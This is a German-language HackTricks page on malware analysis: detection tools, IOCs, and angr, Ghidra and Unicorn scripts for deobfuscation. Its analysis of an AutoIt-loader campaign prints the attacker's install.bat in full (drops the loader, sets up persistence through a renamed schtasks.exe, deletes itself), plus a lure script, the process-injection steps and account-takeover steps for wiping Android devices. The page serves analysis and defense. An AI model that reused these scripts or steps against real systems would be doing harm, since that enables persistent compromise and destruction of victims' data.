# Malware-Analyse

{{#include ../../banners/hacktricks-training.md}}

## Forensik-CheatSheets

[https://www.jaiminton.com/cheatsheet/DFIR/#](https://www.jaiminton.com/cheatsheet/DFIR/)

## Online-Dienste

- [VirusTotal](https://www.virustotal.com/gui/home/upload)
- [HybridAnalysis](https://www.hybrid-analysis.com)
- [Koodous](https://koodous.com)
- [Intezer](https://analyze.intezer.com)
- [Any.Run](https://any.run/)

## Offline-Antivirus- und Erkennungs-Tools

### Yara

#### Installation
```bash
sudo apt-get install -y yara
```
#### Regeln vorbereiten

Verwende dieses Skript, um alle yara malware rules von github herunterzuladen und zusammenzuführen: [https://gist.github.com/andreafortuna/29c6ea48adf3d45a979a78763cdc7ce9](https://gist.github.com/andreafortuna/29c6ea48adf3d45a979a78763cdc7ce9)\
Erstelle das _**rules**_ Verzeichnis und führe es aus. Dies erstellt eine Datei namens _**malware_rules.yar**_, die alle yara rules für malware enthält.
```bash
wget https://gist.githubusercontent.com/andreafortuna/29c6ea48adf3d45a979a78763cdc7ce9/raw/4ec711d37f1b428b63bed1f786b26a0654aa2f31/malware_yara_rules.py
mkdir rules
python malware_yara_rules.py
```
#### Scannen
```bash
yara -w malware_rules.yar image  #Scan 1 file
yara -w malware_rules.yar folder #Scan the whole folder
```
#### YaraGen: Auf malware prüfen und Regeln erstellen

Sie können das Tool [**YaraGen**](https://github.com/Neo23x0/yarGen) verwenden, um yara rules aus einem binary zu generieren. Siehe diese Tutorials: [**Part 1**](https://www.nextron-systems.com/2015/02/16/write-simple-sound-yara-rules/), [**Part 2**](https://www.nextron-systems.com/2015/10/17/how-to-write-simple-but-sound-yara-rules-part-2/), [**Part 3**](https://www.nextron-systems.com/2016/04/15/how-to-write-simple-but-sound-yara-rules-part-3/)
```bash
python3 yarGen.py --update
python3.exe yarGen.py --excludegood -m  ../../mals/
```
### ClamAV

#### Installation
```
sudo apt-get install -y clamav
```
#### Scan
```bash
sudo freshclam      #Update rules
clamscan filepath   #Scan 1 file
clamscan folderpath #Scan the whole folder
```
### [Capa](https://github.com/mandiant/capa)

**Capa** erkennt potenziell bösartige **capabilities** in ausführbaren Dateien: PE, ELF, .NET. Es findet beispielsweise Att\&ck tactics oder verdächtige capabilities wie:

- check for OutputDebugString error
- run as a service
- create process

Hol es dir im [**Github repo**](https://github.com/mandiant/capa).

### IOCs

IOC bedeutet Indicator Of Compromise. Ein IOC ist eine Menge von **conditions that identify** potenziell unerwünschte Software oder bestätigte **malware**. Blue Teams verwenden diese Art von Definition, um in ihren **systems** und **networks** nach dieser Art von bösartigen Dateien zu **search for this kind of malicious files**.\
Das Teilen dieser Definitionen ist sehr nützlich: Wenn malware auf einem Computer identifiziert wird und ein IOC für diese malware erstellt wird, können andere Blue Teams es verwenden, um die malware schneller zu identifizieren.

Ein Tool zum Erstellen oder Ändern von IOCs ist [**IOC Editor**](https://www.fireeye.com/services/freeware/ioc-editor.html)**.**\
Man kann Tools wie [**Redline**](https://www.fireeye.com/services/freeware/redline.html) verwenden, um **nach definierten IOCs auf einem Gerät zu suchen**.

### Loki

[**Loki**](https://github.com/Neo23x0/Loki) ist ein Scanner für Simple Indicators of Compromise.\
Die Detection basiert auf vier Erkennungsmethoden:
```
1. File Name IOC
Regex match on full file path/name

2. Yara Rule Check
Yara signature matches on file data and process memory

3. Hash Check
Compares known malicious hashes (MD5, SHA1, SHA256) with scanned files

4. C2 Back Connect Check
Compares process connection endpoints with C2 IOCs (new since version v.10)
```
### Linux Malware Detect

[**Linux Malware Detect (LMD)**](https://www.rfxn.com/projects/linux-malware-detect/) ist ein Malware-Scanner für Linux, veröffentlicht unter der GNU GPLv2-Lizenz, der für die Bedrohungen in Shared-Hosting-Umgebungen konzipiert wurde. Er verwendet Bedrohungsdaten von Netzwerk-Edge-Intrusion-Detection-Systemen, um Malware zu extrahieren, die aktiv in Angriffen verwendet wird, und generiert Signaturen zur Erkennung. Zusätzlich werden Bedrohungsdaten auch aus Nutzereinsendungen mit dem LMD checkout feature sowie aus Malware-Community-Ressourcen gewonnen.

### rkhunter

Tools wie [**rkhunter**](http://rkhunter.sourceforge.net) können verwendet werden, um das Dateisystem auf mögliche **rootkits** und Malware zu überprüfen.
```bash
sudo ./rkhunter --check -r / -l /tmp/rkhunter.log [--report-warnings-only] [--skip-keypress]
```
### FLOSS

[**FLOSS**](https://github.com/mandiant/flare-floss) ist ein Tool, das versucht, obfuscated strings in executables mithilfe verschiedener Techniken zu finden.

### PEpper

[PEpper ](https://github.com/Th3Hurrican3/PEpper) prüft einige grundlegende Dinge innerhalb der executable (binary data, entropy, URLs and IPs, some yara rules).

### PEstudio

[PEstudio](https://www.winitor.com/download) ist ein Tool, das Informationen über Windows executables wie imports, exports, headers liefert; es prüft außerdem virus total und findet potenzielle Att\&ck techniques.

### Detect It Easy(DiE)

[**DiE**](https://github.com/horsicq/Detect-It-Easy/) ist ein Tool, um zu erkennen, ob eine Datei **encrypted** ist und außerdem **packers** zu finden.

### NeoPI

[**NeoPI** ](https://github.com/CiscoCXSecurity/NeoPI) ist ein Python-Skript, das eine Vielzahl von **statistical methods** nutzt, um **obfuscated** und **encrypted** Inhalte in Text-/Script-Dateien zu erkennen. Der beabsichtigte Zweck von NeoPI ist, bei der **detection of hidden web shell code** zu helfen.

### **php-malware-finder**

[**PHP-malware-finder**](https://github.com/nbs-system/php-malware-finder) versucht sein Bestes, **obfuscated**/**dodgy code** zu erkennen sowie Dateien zu finden, die **PHP**-Funktionen verwenden, die häufig in **malwares**/webshells eingesetzt werden.

### Apple Binary Signatures

Beim Überprüfen einer **malware sample** solltest du immer die **Signatur** der Binary prüfen, da der **Entwickler**, der sie signiert hat, möglicherweise bereits mit **malware** in Verbindung stehen könnte.
```bash
#Get signer
codesign -vv -d /bin/ls 2>&1 | grep -E "Authority|TeamIdentifier"

#Check if the app’s contents have been modified
codesign --verify --verbose /Applications/Safari.app

#Check if the signature is valid
spctl --assess --verbose /Applications/Safari.app
```
## Erkennungstechniken

### File Stacking

Wenn du weißt, dass ein Ordner, der die **Dateien** eines Webservers enthält, **zu einem bestimmten Datum zuletzt aktualisiert wurde**, überprüfe das **Datum**, an dem **alle Dateien** im **Webserver** erstellt und geändert wurden, und wenn ein Datum **verdächtig** ist, untersuche diese Datei.

### Baselines

Wenn die Dateien eines Ordners **nicht hätten geändert werden dürfen**, kannst du den **hash** der **Originaldateien** des Ordners berechnen und mit den **aktuellen** vergleichen. Alles, was verändert wurde, ist **verdächtig**.

### Statistical Analysis

Wenn die Informationen in Logs gespeichert sind, kannst du **Statistiken prüfen**, z. B. wie oft jede Datei eines Webservers aufgerufen wurde, da eine web shell möglicherweise zu den häufigsten gehört.

---

### Android in-app native telemetry (no root)

Auf Android kannst du nativen Code im Prozess der Ziel-App instrumentieren, indem du eine kleine Logger-Bibliothek preloadest, bevor andere JNI-Libs initialisiert werden. Das verschafft frühe Einsicht in natives Verhalten ohne systemweite Hooks oder Root. Ein verbreiteter Ansatz ist SoTap: lege libsotap.so für die passende ABI in das APK und injiziere früh einen System.loadLibrary("sotap")-Aufruf (z. B. statischer Initializer oder Application.onCreate), dann sammle Logs aus internen/externen Pfaden oder als Fallback aus Logcat.

See the Android native reversing page for setup details and log paths:

{{#ref}}
../../mobile-pentesting/android-app-pentesting/reversing-native-libraries.md
{{#endref}}

---

### Android/JNI native string deobfuscation with angr + Ghidra

Einige Android-Malware und RASP-geschützte Apps verstecken JNI-Methodennamen und Signaturen, indem sie diese zur Laufzeit dekodieren, bevor RegisterNatives aufgerufen wird. Wenn Frida/ptrace-Instrumentation durch Anti-Debug blockiert wird, kannst du den Klartext offline wiederherstellen, indem du den in-binary Decoder mit angr ausführst und die Ergebnisse anschließend als Kommentare in Ghidra zurückspielst.

Kernidee: Behandle den Decoder innerhalb der .so als aufrufbare Funktion, führe ihn auf den obfuskierten Byte-Blobs in .rodata aus und konkretisiere die Ausgabebytes bis zum ersten \x00 (C-string terminator). Sorge dafür, dass angr und Ghidra dieselbe image base verwenden, um Adressabweichungen zu vermeiden.

Workflow overview
- Triage in Ghidra: identifiziere den Decoder und dessen calling convention/Argumente in JNI_OnLoad und der RegisterNatives-Konfiguration.
- Run angr (CPython3) um den Decoder für jeden Zielstring auszuführen und die Ergebnisse zu dumpen.
- Annotate in Ghidra: automatische Kommentare mit den dekodierten Strings an jedem Call-Site für eine schnelle JNI-Rekonstruktion.

Ghidra triage (JNI_OnLoad pattern)
- Apply JNI datatypes to JNI_OnLoad so Ghidra recognises JNINativeMethod structures.
- Typical JNINativeMethod per Oracle docs:

```c
typedef struct {
char *name;      // e.g., "nativeFoo"
char *signature; // e.g., "()V", "()[B"
void *fnPtr;     // native implementation address
} JNINativeMethod;
```
- Look for calls to RegisterNatives. If the library constructs the name/signature with a local routine (e.g., FUN_00100e10) that references a static byte table (e.g., DAT_00100bf4) and takes parameters like (encoded_ptr, out_buf, length), that is an ideal target for offline execution.

angr setup (execute the decoder offline)
- Load the .so with the same base used in Ghidra (example: 0x00100000) and disable auto-loading of external libs to keep the state small.

<details>
<summary>angr-Setup und Offline-Decoder-Ausführung</summary>
```python
import angr, json

project = angr.Project(
'/path/to/libtarget.so',
load_options={'main_opts': {'base_addr': 0x00100000}},
auto_load_libs=False,
)

ENCODING_FUNC_ADDR = 0x00100e10  # decoder function discovered in Ghidra

def decode_string(enc_addr, length):
# fresh blank state per evaluation
st = project.factory.blank_state()
outbuf = st.heap.allocate(length)
call = project.factory.callable(ENCODING_FUNC_ADDR, base_state=st)
ret_ptr = call(enc_addr, outbuf, length)  # returns outbuf pointer
rs = call.result_state
raw = rs.solver.eval(rs.memory.load(ret_ptr, length), cast_to=bytes)
return raw.split(b'\x00', 1)[0].decode('utf-8', errors='ignore')

# Example: decode a JNI signature at 0x100933 of length 5 → should be ()[B
print(decode_string(0x00100933, 5))
```
</details>

- In großem Maßstab, erstelle eine statische Zuordnung von call sites zu den Argumenten des Decoders (encoded_ptr, size). Wrappers können Argumente verbergen, daher kannst du diese Zuordnung manuell aus Ghidra xrefs erstellen, wenn die API-Rekonstruktion zu ungenau ist.

<details>
<summary>Mehrere call sites stapelweise mit angr dekodieren</summary>
```python
# call_site -> (encoded_addr, size)
call_site_args_map = {
0x00100f8c: (0x00100b81, 0x41),
0x00100fa8: (0x00100bca, 0x04),
0x00100fcc: (0x001007a0, 0x41),
0x00100fe8: (0x00100933, 0x05),
0x0010100c: (0x00100c62, 0x41),
0x00101028: (0x00100c15, 0x16),
0x00101050: (0x00100a49, 0x101),
0x00100cf4: (0x00100821, 0x11),
0x00101170: (0x00100940, 0x101),
0x001011cc: (0x0010084e, 0x13),
0x00101334: (0x001007e9, 0x0f),
0x00101478: (0x0010087d, 0x15),
0x001014f8: (0x00100800, 0x19),
0x001015e8: (0x001008e6, 0x27),
0x0010160c: (0x00100c33, 0x13),
}

decoded_map = { hex(cs): decode_string(enc, sz)
for cs, (enc, sz) in call_site_args_map.items() }

import json
print(json.dumps(decoded_map, indent=2))
with open('decoded_strings.json', 'w') as f:
json.dump(decoded_map, f, indent=2)
```
</details>

Aufrufstellen in Ghidra annotieren
Option A: Nur Jython Kommentarschreiber (verwende ein vorab erzeugtes JSON)
- Da angr CPython3 erfordert, halte deobfuscation und Annotation getrennt. Führe zuerst das oben genannte angr-Skript aus, um decoded_strings.json zu erzeugen. Dann führe dieses Jython GhidraScript aus, um PRE_COMMENTs an jeder Aufrufstelle zu schreiben (und den Namen der aufrufenden Funktion zur Kontextangabe einzufügen):

<details>
<summary>Ghidra Jython-Skript zur Annotation decodierter JNI-Strings</summary>
```python
#@category Android/Deobfuscation
# Jython in Ghidra 10/11
import json
from ghidra.program.model.listing import CodeUnit

# Ask for the JSON produced by the angr script
f = askFile('Select decoded_strings.json', 'Load')
mapping = json.load(open(f.absolutePath, 'r'))  # keys as hex strings

fm = currentProgram.getFunctionManager()
rm = currentProgram.getReferenceManager()

# Replace with your decoder address to locate call-xrefs (optional)
ENCODING_FUNC_ADDR = 0x00100e10
enc_addr = toAddr(ENCODING_FUNC_ADDR)

callsite_to_fn = {}
for ref in rm.getReferencesTo(enc_addr):
if ref.getReferenceType().isCall():
from_addr = ref.getFromAddress()
fn = fm.getFunctionContaining(from_addr)
if fn:
callsite_to_fn[from_addr.getOffset()] = fn.getName()

# Write comments from JSON
for k_hex, s in mapping.items():
cs = int(k_hex, 16)
site = toAddr(cs)
caller = callsite_to_fn.get(cs, None)
text = s if caller is None else '%s @ %s' % (s, caller)
currentProgram.getListing().setComment(site, CodeUnit.PRE_COMMENT, text)
print('[+] Annotated %d call sites' % len(mapping))
```
</details>

Option B: Ein einzelnes CPython-Skript über pyhidra/ghidra_bridge
- Alternativ kann pyhidra oder ghidra_bridge verwendet werden, um Ghidra’s API aus demselben CPython-Prozess heraus zu steuern, der angr ausführt. Dadurch lässt sich decode_string() aufrufen und sofort PRE_COMMENTs setzen, ohne eine Zwischen-Datei. Die Logik spiegelt das Jython-Skript wider: Erstelle eine callsite→function-Map über ReferenceManager, dekodiere mit angr und setze Kommentare.

Why this works and when to use it
- Offline-Ausführung umgeht RASP/Anti-Debug: kein ptrace, keine Frida-Hooks nötig, um Strings zu rekonstruieren.
- Wenn Ghidra und angr denselben base_addr verwenden (z. B. 0x00100000), stimmen Function-/Datenadressen über die Tools hinweg überein.
- Wiederholbares Rezept für Decoder: Behandle die Transformation als reine Funktion, allokiere einen Ausgabe-Puffer in einem frischen State, rufe sie mit (encoded_ptr, out_ptr, len) auf, konkretisiere dann via state.solver.eval und parse C-strings bis \x00.

Notes and pitfalls
- Berücksichtige die Ziel-ABI/calling convention. angr.factory.callable wählt eine basierend auf der arch; wenn Argumente verschoben erscheinen, gib cc explizit an.
- Wenn der Decoder null-initialisierte Ausgabepuffer erwartet, initialisiere outbuf vor dem Aufruf mit Nullen im State.
- Für position-unabhängige Android .so immer base_addr angeben, damit Adressen in angr denen in Ghidra entsprechen.
- Verwende currentProgram.getReferenceManager(), um call-xrefs aufzulisten, selbst wenn die App den Decoder hinter dünnen Stubs verbirgt.

For angr basics, see: [angr basics](../../reversing/reversing-tools-basic-methods/angr/README.md)

---

## Deobfuskation dynamischer Kontrollflüsse (JMP/CALL RAX Dispatchers)

Moderne Malware-Familien missbrauchen stark Control-Flow-Graph (CFG)-Obfuskation: statt eines direkten jump/call berechnen sie das Ziel zur Laufzeit und führen ein `jmp rax` oder `call rax` aus. Ein kleiner Dispatcher (typischerweise neun Instruktionen) setzt das finale Ziel abhängig von den CPU-Flags `ZF`/`CF` und bricht damit die statische CFG-Wiederherstellung komplett.

Die Technik – demonstriert vom SLOW#TEMPEST loader – kann mit einem dreistufigen Workflow besiegt werden, der nur auf IDAPython und dem Unicorn CPU emulator beruht.

### 1. Locate every indirect jump / call
```python
import idautils, idc

for ea in idautils.FunctionItems(idc.here()):
mnem = idc.print_insn_mnem(ea)
if mnem in ("jmp", "call") and idc.print_operand(ea, 0) == "rax":
print(f"[+] Dispatcher found @ {ea:X}")
```
### 2. Extrahiere den Dispatcher-Bytecode
```python
import idc

def get_dispatcher_start(jmp_ea, count=9):
s = jmp_ea
for _ in range(count):
s = idc.prev_head(s, 0)
return s

start = get_dispatcher_start(jmp_ea)
size  = jmp_ea + idc.get_item_size(jmp_ea) - start
code  = idc.get_bytes(start, size)
open(f"{start:X}.bin", "wb").write(code)
```
### 3. Emuliere es zweimal mit Unicorn
```python
from unicorn import *
from unicorn.x86_const import *
import struct

def run(code, zf=0, cf=0):
BASE = 0x1000
mu = Uc(UC_ARCH_X86, UC_MODE_64)
mu.mem_map(BASE, 0x1000)
mu.mem_write(BASE, code)
mu.reg_write(UC_X86_REG_RFLAGS, (zf << 6) | cf)
mu.reg_write(UC_X86_REG_RAX, 0)
mu.emu_start(BASE, BASE+len(code))
return mu.reg_read(UC_X86_REG_RAX)
```
Führe `run(code,0,0)` und `run(code,1,1)` aus, um die *false*- und *true*-Branch-Ziele zu erhalten.

### 4. Einen direkten jump / call zurückpatchen
```python
import struct, ida_bytes

def patch_direct(ea, target, is_call=False):
op   = 0xE8 if is_call else 0xE9           # CALL rel32 or JMP rel32
disp = target - (ea + 5) & 0xFFFFFFFF
ida_bytes.patch_bytes(ea, bytes([op]) + struct.pack('<I', disp))
```
Nach dem Patchen zwinge IDA, die Funktion neu zu analysieren, damit das vollständige CFG und die Hex-Rays-Ausgabe wiederhergestellt werden:
```python
import ida_auto, idaapi
idaapi.reanalyze_function(idc.get_func_attr(ea, idc.FUNCATTR_START))
```
### 5. Markiere indirekte API-Aufrufe

Sobald das tatsächliche Ziel jedes `call rax` bekannt ist, kannst du IDA mitteilen, welches Ziel es ist, sodass Parameter-Typen & Variablennamen automatisch wiederhergestellt werden:
```python
idc.set_callee_name(call_ea, resolved_addr, 0)  # IDA 8.3+
```
### Praktische Vorteile

* Stellt das echte CFG wieder her → die Decompilation geht von *10* Zeilen auf Tausende.
* Ermöglicht string-cross-reference & xrefs, was die Rekonstruktion des Verhaltens trivial macht.
* Skripte sind wiederverwendbar: man kann sie in jeden Loader einsetzen, der mit demselben Trick geschützt ist.

---

## AutoIt-based loaders: .a3x decryption, Task Scheduler masquerade and RAT injection

Dieses Intrusionsmuster kombiniert ein signiertes MSI, AutoIt loaders, die zu .a3x kompiliert wurden, und einen Task Scheduler-Job, der sich als harmlose App tarnt.

### MSI → benutzerdefinierte Aktionen → AutoIt orchestrator

Prozessbaum und von den MSI custom actions ausgeführte Befehle:

- MsiExec.exe → cmd.exe, um install.bat auszuführen
- WScript.exe, um einen vorgetäuschten Fehlerdialog anzuzeigen
```cmd
%SystemRoot%\system32\cmd.exe /c %APPDATA%\스트레스 클리어\install.bat
%SystemRoot%\System32\WScript.exe %APPDATA%\스트레스 클리어\error.vbs
```
install.bat (legt loader ab, setzt persistence, reinigt sich selbst):
```bat
@echo off
set dr=Music

copy "%~dp0AutoIt3.exe" %public%\%dr%\AutoIt3.exe
copy "%~dp0IoKlTr.au3" %public%\%dr%\IoKlTr.au3

cd /d %public%\%dr% & copy c:\windows\system32\schtasks.exe hwpviewer.exe ^
& hwpviewer /delete /tn "IoKlTr" /f ^
& hwpviewer /create /sc minute /mo 1 /tn "IoKlTr" /tr "%public%\%dr%\AutoIt3.exe %public%\%dr%\IoKlTr.au3"

del /f /q "%~dp0AutoIt3.exe"
del /f /q "%~dp0IoKlTr.au3"
del /f /q "%~f0"
```
error.vbs (Benutzerköder):
```vb
MsgBox "현재 시스템 언어팩과 프로그램 언어팩이 호환되지 않아 실행할 수 없습니다." & vbCrLf & _
"설정에서 한국어(대한민국) 언어팩을 설치하거나 변경한 뒤 다시 실행해 주세요.", _
vbCritical, "언어팩 오류"
```
Wesentliche Artefakte und Tarnung:
- Legt AutoIt3.exe und IoKlTr.au3 in C:\Users\Public\Music ab
- Kopiert schtasks.exe nach hwpviewer.exe (tarnte sich als Hangul Word Processor Viewer)
- Erstellt eine geplante Aufgabe "IoKlTr", die jede Minute ausgeführt wird
- Startup LNK erscheint als Smart_Web.lnk; mutex: `Global\AB732E15-D8DD-87A1-7464-CE6698819E701`
- Legt Module unter %APPDATA%\Google\Browser\ in Unterordnern mit `adb` oder `adv` ab und startet sie über autoit.vbs/install.bat-Helfer

Forensische Triage-Tipps:
- schtasks-Auflistung: `schtasks /query /fo LIST /v | findstr /i "IoKlTr hwpviewer"`
- Suche nach umbenannten Kopien von schtasks.exe, die neben der Task-XML liegen: `dir /a "C:\Users\Public\Music\hwpviewer.exe"`
- Häufige Pfade: `C:\Users\Public\Music\AutoIt3.exe`, `...\IoKlTr.au3`, Startup `Smart_Web.lnk`, `%APPDATA%\Google\Browser\(adb|adv)*`
- Korrelation der Prozess-Erstellung: AutoIt3.exe startet legitime Windows-Binärdateien (z. B. cleanmgr.exe, hncfinder.exe)

### AutoIt loaders und .a3x payload decryption → injection

- AutoIt-Module werden mit `#AutoIt3Wrapper_Outfile_type=a3x` kompiliert und entschlüsseln eingebettete Payloads, bevor sie in harmlose Prozesse injiziert werden.
- Beobachtete Familien: QuasarRAT (in hncfinder.exe injiziert) und RftRAT/RFTServer (in cleanmgr.exe injiziert), sowie RemcosRAT-Module (`Remcos\RunBinary.a3x`).
- Entschlüsselungsmuster: Einen AES-Schlüssel über HMAC ableiten, das eingebettete Blob entschlüsseln und dann das Klartextmodul injizieren.

Generisches Entschlüsselungs-Skelett (der genaue HMAC-Input/Algorithmus ist familienabhängig):
```python
import hmac, hashlib
from Crypto.Cipher import AES

def derive_aes_key(secret: bytes, data: bytes) -> bytes:
# Example: HMAC-SHA256 → first 16/32 bytes as AES key
return hmac.new(secret, data, hashlib.sha256).digest()

def aes_decrypt_cbc(key: bytes, iv: bytes, ct: bytes) -> bytes:
return AES.new(key, AES.MODE_CBC, iv=iv).decrypt(ct)
```
Typischer injection-Ablauf (CreateRemoteThread-style):
- CreateProcess (suspended) des Zielprozesses (z. B. cleanmgr.exe)
- VirtualAllocEx + WriteProcessMemory mit entschlüsseltem Modul/Shellcode
- CreateRemoteThread oder QueueUserAPC zur Ausführung des payloads

Hunting-Ideen
- AutoIt3.exe als Kindprozess von MsiExec.exe oder WScript.exe, der System-Utilities startet
- Dateien mit `.a3x`-Erweiterung oder AutoIt script runner unter öffentlichen/benutzerschreibbaren Pfaden
- Verdächtige geplante Tasks, die AutoIt3.exe oder nicht von Microsoft signierte Binaries ausführen, mit Triggern im Minutenbereich

### Account-takeover-Missbrauch von Android Find My Device (Find Hub)

Während der Windows-Kompromittierung nutzten Operatoren gestohlene Google-Zugangsdaten, um die Android-Geräte des Opfers wiederholt zu löschen, Benachrichtigungen zu unterdrücken, während sie über den auf dem Desktop angemeldeten Messenger des Opfers ihren Zugriff ausweiteten.

Schritte der Operatoren (aus einer angemeldeten Browser-Sitzung):
- Google Account → Security → Your devices aufrufen; Find My Phone → Find Hub folgen (https://www.google.com/android/find)
- Gerät auswählen → Google-Passwort erneut eingeben → "Erase device" (factory reset) auslösen; wiederholen, um Wiederherstellung zu verzögern
- Optional: Alarm-E-Mails im verknüpften Postfach (z. B. Naver) löschen, um Sicherheitsbenachrichtigungen zu verbergen

## Tracing stark obfuskierter Node.js loader

Angreifer bündeln zunehmend JavaScript-Loader in eigenständige Windows-Binaries, die mit [`nexe`](https://github.com/nexe/nexe) kompiliert wurden, sodass die Runtime zusammen mit dem Skript ausgeliefert wird. Die resultierende PE ist oft 60–90 MB groß und läuft auch, wenn Node.js nicht installiert ist. Während der Triage:

- Verwenden Sie [`nexe_unpacker`](https://npm.io/package/nexe_unpacker), um das eingebettete JavaScript aus der PE herauszuschneiden und es lokalen Tools für statisches Diffing zuzuführen.
- Erwarten Sie ein auf der Festplatte basierendes Mutex in `%TEMP%` (GachiLoader legt eine zufällige `<name>.lock`-Datei ab, die nach ~5 Minuten verfällt). Das Kopieren der Datei in die Sandbox vor der Ausführung erlaubt es, redundante Stufen zu überspringen, während man trotzdem spätere payloads sieht.

### Node.js API tracing zur Umgehung von Anti-Analysis

Check Point’s [Nodejs-Tracer](https://github.com/CheckPointSW/Nodejs-Tracer) hookt Core-Module in jedem Node.js-Prozess, ermöglicht das Spoofen von anti-VM-Probes und bewahrt alle Artefakte, die die Sample schreibt. Starte obfuskierte Skripte über den Tracer, um analysten-kontrollierte Instrumentierung im Call-Stack zu halten:
```powershell
node -r .\tracer.js main.js
```
Wichtige Konfigurationsschalter in `tracer.js` erlauben es dir:

- Filesystem-, Child-Process- und HTTP-Aktivitäten zu protokollieren (`LOG_HTTP_REQUESTS`, `SAVE_FILE_WRITES`). Jede abgelegte Datei — z. B. `kidkadi.node` — wird in das Arbeitsverzeichnis kopiert, bevor die Malware sie löscht.
- Umgebungs-Fingerprints zu überschreiben, indem realistische RAM-/CPU-Angaben zurückgegeben, `tasklist`-Ausgaben gefälscht und PowerShell-/WMI-Antworten manipuliert werden. Das umgeht Loader, die ≥4 GB RAM, ≥2 Cores verlangen und Benutzernamen (`mashinesssss`, `wdagutilityaccount`, etc.), Hostnamen (`desktop-vrsqlag`, `server1` …) und Prozessnamen (`vmtoolsd.exe`, `fiddler.exe`, `x64dbg.exe`, `frida-server.exe`) prüfen.
- WMI-Hardwareprüfungen zu neutralisieren, z. B. `Get-WmiObject Win32_DiskDrive` (Suche nach `vmware`, `kvm`, `virtio`, …), `Win32_VideoController` (blockiert “VirtualBox Graphics Adapter”, “Hyper-V Video”, etc.) und die Zählung von `Win32_PortConnector`. Wenn diese Abfragen “echte” Hardware melden, geraten Sandboxes nicht mehr in die Endlosschleife harmloser `Invoke-WebRequest`-Aufrufe zu `linkedin.com`, `grok.com`, `whatsapp.com` und ähnlichen Domains, die GachiLoader zur Verzögerung der Analyse verwendet.

### Gated C2-Verkehr automatisch erfassen

Die Netzwerk-Hooks des Tracers offenbaren mehrschichtige C2-Authentifizierung, ohne die JavaScript-Obfuskation rückzuentwickeln. In der beobachteten Kampagne führt der Loader:

1. POSTet Host-Telemetrie an `/log` auf jedem hard-codierten C2.
2. Führt `GET /richfamily/<per-sample key>` mit `X-Secret: gachifamily` aus, um eine Base64-kodierte Payload-URL zu erhalten.
3. Macht ein abschließendes `GET` zu dieser URL mit einem langen pro-Sample `X-Secret`-Header; fehlt dieser, gibt es `403 Forbidden` zurück.

Da der Tracer vollständige Requests (Header, Bodies, Ziele) aufzeichnet, kannst du denselben Traffic wiederholen, Payloads herunterladen, Themida/VMProtect-Shells im Speicher ausdumpen und Rhadamanthys-Konfigurationsdaten in großem Maßstab extrahieren.

## AdaptixC2: Konfigurations-Extraktion und TTPs

Siehe die dedizierte Seite:

{{#ref}}
adaptixc2-config-extraction-and-ttps.md
{{#endref}}

## Quellen

- [Unit42 – Evolving Tactics of SLOW#TEMPEST: A Deep Dive Into Advanced Malware Techniques](https://unit42.paloaltonetworks.com/slow-tempest-malware-obfuscation/)
- SoTap: Lightweight in-app JNI (.so) behavior logger – [github.com/RezaArbabBot/SoTap](https://github.com/RezaArbabBot/SoTap)
- Strategies for Analyzing Native Code in Android Applications: Combining Ghidra and Symbolic Execution for Code Decryption and Deobfuscation – [revflash.medium.com](https://revflash.medium.com/strategies-for-analyzing-native-code-in-android-applications-combining-ghidra-and-symbolic-aaef4c9555df)
- Ghidra – [github.com/NationalSecurityAgency/ghidra](https://github.com/NationalSecurityAgency/ghidra)
- angr – [angr.io](https://angr.io/)
- JNI_OnLoad and invocation API – [docs.oracle.com](https://docs.oracle.com/javase/8/docs/technotes/guides/jni/spec/invocation.html#JNJI_OnLoad)
- RegisterNatives – [docs.oracle.com](https://docs.oracle.com/javase/8/docs/technotes/guides/jni/spec/functions.html#RegisterNatives)
- Tracing JNI Functions – [valsamaras.medium.com](https://valsamaras.medium.com/tracing-jni-functions-75b04bee7c58)
- Native Enrich: Scripting Ghidra and Frida to discover hidden JNI functions – [laripping.com](https://laripping.com/blog-posts/2021/12/20/nativeenrich.html)
- [Unit42 – AdaptixC2: A New Open-Source Framework Leveraged in Real-World Attacks](https://unit42.paloaltonetworks.com/adaptixc2-post-exploitation-framework/)
- KONNI-linked APT abuses Google Find Hub to wipe Android devices after Windows intrusion – [genians.co.kr](https://www.genians.co.kr/en/blog/threat_intelligence/android)
- Android Find My Device (Find Hub) – [google.com/android/find](https://www.google.com/android/find)
- RftRAT/RFTServer technical analysis – [asec.ahnlab.com](https://asec.ahnlab.com/en/59590/)
- HMAC background – [wikipedia.org/wiki/HMAC](https://en.wikipedia.org/wiki/HMAC)
- [Check Point Research – GachiLoader: Defeating Node.js Malware with API Tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [Nodejs-Tracer – GitHub](https://github.com/CheckPointSW/Nodejs-Tracer)

{{#include ../../banners/hacktricks-training.md}}
